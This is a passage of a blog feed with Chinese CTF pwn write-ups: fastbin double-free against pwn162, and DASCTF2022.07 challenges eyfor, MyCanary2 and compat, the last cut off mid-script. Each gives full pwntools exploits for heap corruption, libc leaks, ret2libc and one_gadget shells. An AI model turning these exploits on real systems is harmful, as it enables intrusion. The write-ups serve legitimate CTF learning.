fake_file.ljust(<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment">#</span><br>payload += fake_file + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(heap_addr+<span class="hljs-number">0x118</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(system_addr) <span class="hljs-comment">#伪造vtable位置</span><br><br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>io.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>gdb.attach(io)<br>io.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Size :&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;32&#x27;</span>)<br><br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>常回家看看之fastbin_attack</title>
    <link href="/2024/08/02/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bfastbin-attack/"/>
    <url>/2024/08/02/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bfastbin-attack/</url>
    
    <content type="html"><![CDATA[<h3 id="常回家看看之fastbin-attack"><a href="#常回家看看之fastbin-attack" class="headerlink" title="常回家看看之fastbin_attack"></a><strong>常回家看看之fastbin_attack</strong></h3><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a><strong>原理分析</strong></h3><p>fastbin属于小堆块的管理，这里说的fastbin_attack大多指glibc2.26之前的手法，因为自glibc2.26以后，glibc迎来了一位新成员tcachebin，它减少了堆的开销，使堆管理变得迅速而高效，而且申请的小堆块会优先进入tachebin中，只有tachebin其中一个链表满了再次申请一个相同大小的堆块，若是小堆块再次free会进入fastbin中。</p><p>下面主要看一下fastbin，在glibc2.26以前对fastbin double free的检查没有那么严格，也就是说，如果程序里面有UAF漏洞，我们只要free第一个堆块之后free一个别的堆块，再次free第一个堆块，导致double free，实现堆块的伪造和堆块重叠。</p><p>也就是如下这种情况</p><p><img src="/2024/08/02/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bfastbin-attack/image-20240802185607035.png" alt="image-20240802185607035"></p><p>在pwngdb里面是这样的</p><p><img src="/2024/08/02/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bfastbin-attack/image-20240802185652506.png" alt="image-20240802185652506"></p><p>那么下次申请堆块的时候会把chunk0申请走，如果此时修改了chunk0的fd指针那么就导致把fake_chunk加入到fastbin链表中</p><p>就是如下这种情况</p><p><img src="/2024/08/02/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bfastbin-attack/image-20240802185852246.png" alt="image-20240802185852246"></p><p>那么就可以实现堆块重叠</p><h3 id="例题演示"><a href="#例题演示" class="headerlink" title="例题演示"></a>例题演示</h3><h4 id="题目保护情况"><a href="#题目保护情况" class="headerlink" title="题目保护情况"></a>题目保护情况</h4><p><img src="/2024/08/02/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bfastbin-attack/image-20240802191222008.png" alt="image-20240802191222008"></p><h4 id="64位ida逆向"><a href="#64位ida逆向" class="headerlink" title="64位ida逆向"></a>64位ida逆向</h4><p>菜单</p><p><img src="/2024/08/02/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bfastbin-attack/image-20240802191623680.png" alt="image-20240802191623680"></p><p>add函数，存在堆块数量上限，申请堆块之前申请了一个0x28大小的控制堆块，在控制堆块+8位置写上数据堆块地址，然后最后可以向控制堆块+16处的地址可以输入23字节的数据</p><p><img src="/2024/08/02/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bfastbin-attack/image-20240802191904959.png" alt="image-20240802191904959"></p><p>free函数，存在UAF漏洞，及可以double free</p><p><img src="/2024/08/02/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bfastbin-attack/image-20240802192240600.png" alt="image-20240802192240600"></p><p>show函数，没有实际的功能</p><p><img src="/2024/08/02/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bfastbin-attack/image-20240802193847109.png" alt="image-20240802193847109"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>程序没有show功能，我们申请堆块的时候先申请到的控制堆块，然后才是自己输入的size的堆块，但是大小有限制导致不难申请到unsortbin范围大小的chunk，但是我们可以向控制堆块输入内容，导致可以伪造chunk的size位，泄露libc地址只能位置堆块实现堆块重叠，程序存在UAF漏洞，可以double free 从而可以伪造堆块，修改size为unsortbin 大小的范围然后free掉堆块</p><p>此时堆块情况</p><p><img src="/2024/08/02/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bfastbin-attack/image-20240802194449553.png" alt="image-20240802194449553"></p><p>但是此时堆块size位为0x91，申请堆块的时候fastbin有检查，因此我们要复原堆块的size，但是由于没有show功能，所以可以申请堆块到IO结构体上，修改_IO_write_base 导致泄露libc地址，远程的话需要爆破高字节。</p><p><img src="/2024/08/02/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bfastbin-attack/image-20240802194908254.png" alt="image-20240802194908254"></p><p>堆块7为了防止申请堆块的时候控制堆块切割unsortbin chunk。</p><p><img src="/2024/08/02/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bfastbin-attack/image-20240802195055497.png" alt="image-20240802195055497"></p><p>然后用同样的手法在__malloc_hook 和   _realloc_hook布置上one_gadget，即可拿到shell</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;../pwn162&#x27;</span>)<br><span class="hljs-comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28304)</span><br>libc = ELF(<span class="hljs-string">&#x27;/home/su/PWN/VIPshow/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Add</span>(<span class="hljs-params">size,name,msg=<span class="hljs-number">8</span> * <span class="hljs-string">b&#x27;\x00&#x27;</span> + p64(<span class="hljs-params"><span class="hljs-number">0x71</span></span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span></span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice : &quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;size of the daniu&#x27;s name: \n&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    io.sendafter(<span class="hljs-string">&quot;daniu&#x27;s name:\n&quot;</span>, name)<br>    io.sendlineafter(<span class="hljs-string">&quot;daniu&#x27;s message:\n&quot;</span>, msg)<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Delete</span>(<span class="hljs-params">idx</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice : &quot;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;daniu&#x27;s index:\n&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>    io.recvline()<br><br><br>Add(<span class="hljs-number">0x60</span>, <span class="hljs-number">14</span> * p64(<span class="hljs-number">0x71</span>))  <span class="hljs-comment"># 0</span><br>Add(<span class="hljs-number">0x60</span>, <span class="hljs-number">14</span> * p64(<span class="hljs-number">0x71</span>))  <span class="hljs-comment"># 1</span><br><span class="hljs-comment">#gdb.attach(io)</span><br>Delete(<span class="hljs-number">0</span>)<br>Delete(<span class="hljs-number">1</span>)<br>Delete(<span class="hljs-number">0</span>)<br>gdb.attach(io)<br>Add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;\x20&#x27;</span>)  <span class="hljs-comment"># 2</span><br>Add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;\x20&#x27;</span>)  <span class="hljs-comment"># 3</span><br>Add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;\x20&#x27;</span>)  <span class="hljs-comment"># 4</span><br>Add(<span class="hljs-number">0x60</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>))  <span class="hljs-comment"># 5</span><br><span class="hljs-comment">#gdb.attach(io)</span><br>Delete(<span class="hljs-number">0</span>)<br>Delete(<span class="hljs-number">5</span>)<br>Add(<span class="hljs-number">0x60</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>))  <span class="hljs-comment"># 6</span><br>Add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;bbbb&#x27;</span>)  <span class="hljs-comment"># 7</span><br>Delete(<span class="hljs-number">0</span>)<br>Delete(<span class="hljs-number">5</span>)<br>Delete(<span class="hljs-number">7</span>)<br>Add(<span class="hljs-number">0x60</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">b&#x27;\xdd\x45&#x27;</span>)  <span class="hljs-comment"># 8</span><br><span class="hljs-comment">#gdb.attach(io)</span><br>Delete(<span class="hljs-number">7</span>)<br>Add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;deadbeef&#x27;</span>)  <span class="hljs-comment"># 9</span><br>Delete(<span class="hljs-number">7</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.sendlineafter(<span class="hljs-string">&quot;Your choice : &quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;size of the daniu&#x27;s name: \n&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x60</span>))<br>io.sendafter(<span class="hljs-string">&quot;daniu&#x27;s name:\n&quot;</span>, <span class="hljs-number">0x33</span> * <span class="hljs-string">b&#x27;\x00&#x27;</span> + p64(<span class="hljs-number">0x0FBAD1887</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x58&#x27;</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c46a3</span><br>success(<span class="hljs-string">&#x27;libc_base----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>pause()<br>malloc_hook = libc_base +libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>one = libc_base + <span class="hljs-number">0xf1147</span><br>realloc  = libc_base   + libc.sym[<span class="hljs-string">&#x27;__realloc_hook&#x27;</span>]<br><br><br><br><span class="hljs-comment">#gdb.attach(io)</span><br>io.sendline(<span class="hljs-string">&#x27;a&#x27;</span>)<br>Delete(<span class="hljs-number">5</span>)<br>Delete(<span class="hljs-number">0</span>)<br>Delete(<span class="hljs-number">5</span>)<br><br>Delete(<span class="hljs-number">7</span>)<br>Add(<span class="hljs-number">0x60</span>,p64(malloc_hook -<span class="hljs-number">0x23</span>))<br>Delete(<span class="hljs-number">7</span>)<br>Add(<span class="hljs-number">0x60</span>,p64(malloc_hook -<span class="hljs-number">0x23</span>))<br>Delete(<span class="hljs-number">7</span>)<br>Add(<span class="hljs-number">0x60</span>,p64(malloc_hook -<span class="hljs-number">0x23</span>))<br><br>Delete(<span class="hljs-number">7</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xb</span> + p64(one) + p64(realloc) <br><span class="hljs-comment">#gdb.attach(io)</span><br>Add(<span class="hljs-number">0x60</span>,payload)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.sendlineafter(<span class="hljs-string">&quot;Your choice : &quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br><br><br><br><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF2022.07赋能赛PWN部分WP</title>
    <link href="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/"/>
    <url>/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="DASCTF2022-07赋能赛PWN部分WP"><a href="#DASCTF2022-07赋能赛PWN部分WP" class="headerlink" title="DASCTF2022.07赋能赛PWN部分WP"></a><strong>DASCTF2022.07赋能赛PWN部分WP</strong></h2><h2 id="eyfor"><a href="#eyfor" class="headerlink" title="eyfor"></a>eyfor</h2><h3 id="程序保护情况"><a href="#程序保护情况" class="headerlink" title="程序保护情况"></a>程序保护情况</h3><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802153658517.png" alt="image-20240802153658517"></p><h3 id="64位ida逆向"><a href="#64位ida逆向" class="headerlink" title="64位ida逆向"></a>64位ida逆向</h3><p>可以看见是一个随机数的逻辑，只要我们猜不对4次就可以进入漏洞函数，但是我感觉这原本可能是&#x3D;&#x3D;号，让用随机数的</p><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802153751278.png" alt="image-20240802153751278"></p><p>那我们就4次不输入一个数就可以进入漏洞函数，这里注意这个a1就是我们进入漏洞函数之前要输入的值，可以看见在read的时候使用的是un int 而判断的是int，那么这里就存在一个类型转换导致的整数溢出，我们可以输入比4294967296小一点的数，这样在判断转换的时候是负数，而在输入的时候就是这个大数，所以就可以造成溢出，然后ret2libc</p><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802154047669.png" alt="image-20240802154047669"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>io = process(<span class="hljs-string">&#x27;./eyfor&#x27;</span>)<br><span class="hljs-comment">#io = remote(&#x27;node5.buuoj.cn&#x27;,26262)</span><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./eyfor&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;go&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;message:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;message:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;message:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;message:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>io.sendline(<span class="hljs-string">&#x27;4294967220&#x27;</span>)<br>io.recvline()<br><span class="hljs-comment">#gdb.attach(io)</span><br>pop_rdi = <span class="hljs-number">0x0000000000400983</span> <span class="hljs-comment">#: pop rdi ; ret</span><br><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(pop_rdi) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(<span class="hljs-number">0x4007B7</span>)<br>io.send(payload)<br>io.recvuntil(<span class="hljs-string">&#x27;CST\n&#x27;</span>)<br>puts_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(puts_addr))<br>system = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>] + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>] + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br><br>io.recvline()<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(pop_rdi+<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(binsh) + p64(system)<br>io.send(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><p>不过在复现的时候远程buu平台把data命令禁用了，导致程序还没有开始输入就崩溃了。。。。。</p><h2 id="MyCanary2"><a href="#MyCanary2" class="headerlink" title="MyCanary2"></a>MyCanary2</h2><h3 id="程序保护情况-1"><a href="#程序保护情况-1" class="headerlink" title="程序保护情况"></a>程序保护情况</h3><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802154613358.png" alt="image-20240802154613358"></p><h3 id="64位ida逆向-1"><a href="#64位ida逆向-1" class="headerlink" title="64位ida逆向"></a>64位ida逆向</h3><p>在初始化的时候程序使用了时间戳和随机数异或得到种子</p><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802154650234.png" alt="image-20240802154650234"></p><p>程序虽然没有开canary保护但是模拟了一个类似canary的功能，我们可以查看canary，但是之后canary就会改变，有溢出，但是最后有检查</p><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802154831701.png" alt="image-20240802154831701"></p><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802154930239.png" alt="image-20240802154930239"></p><p>所以我们可以找找漏洞</p><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802155311426.png" alt="image-20240802155311426"></p><p>在检查函数末尾发现如果rbp - 4位置为0就会跳转而不执行检查，那么我们第一步溢出然后，在更新一下这个手工canary绕过检查，然后退出即可执行后门函数</p><p>并且程序存在后门函数</p><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802164450255.png" alt="image-20240802164450255"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level= <span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./MyCanary2&#x27;</span>)<br><br>io.sendlineafter(<span class="hljs-string">&#x27;choice&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0X70</span>-<span class="hljs-number">4</span>) + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)  + p64(<span class="hljs-number">0X40157B</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;code:&#x27;</span>)<br>gdb.attach(io)<br>io.sendline(payload)<br>io.sendlineafter(<span class="hljs-string">&#x27;choice&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;choice&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="compat"><a href="#compat" class="headerlink" title="compat"></a>compat</h2><h3 id="程序保护情况-2"><a href="#程序保护情况-2" class="headerlink" title="程序保护情况"></a>程序保护情况</h3><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802164801080.png" alt="image-20240802164801080"></p><h3 id="64位ida逆向-2"><a href="#64位ida逆向-2" class="headerlink" title="64位ida逆向"></a>64位ida逆向</h3><p>菜单</p><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802164822619.png" alt="image-20240802164822619"></p><p>add函数，这里申请的时候输入tag的时候跟0x80相与，结果作为下一次的输入，我们可以输入0xff绕过，导致溢出到保存堆块指针的位置，然后实现泄露heap地址，同理因为本题libc是2.31，申请7个堆块然后free之后进可以进入到unsortbin，修改指针泄露libc地址，不过要注意，只能申请8个堆块</p><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802164851311.png" alt="image-20240802164851311"></p><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802164919844.png" alt="image-20240802164919844"></p><p>free函数，把指针都清零没有free</p><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802165312445.png" alt="image-20240802165312445"></p><p>freeall函数，遍历刚刚free的堆块然后依次free，指针清零</p><p><img src="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20240802165341344.png" alt="image-20240802165341344"></p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>1.通过\xff绕过与操作，让尽可能多的字节写入，泄露堆块地址</p><p>2.修改堆块指针到unsortbin堆块处，泄露libc地址</p><p>3.伪造堆块让指针修改到fake_chunk处，修改已经free堆块的fd指针位free_hook，因为此题free的内容是控制指针优先，导致&#x2F;bin&#x2F;sh参数或者sh参数不好输入，所以干脆使用one_gadget</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./compact&#x27;</span>)<br><span class="hljs-comment">#io = remote(&#x27;node5.buuoj.cn&#x27;,27724)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">msg,tag</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendafter(<span class="hljs-string">&#x27;data: &#x27;</span>,msg)<br>    io.sendafter(<span class="hljs-string">&#x27;tag: &#x27;</span>,tag)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>            <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">freeall</span>():<br>    io.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>) <br><br><br><br>add(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">b&#x27;\xffaaa&#x27;</span>)<br>gdb.attach(io)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;aaa&#x27;</span>) <br>heap_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x2c0</span><br>success(<span 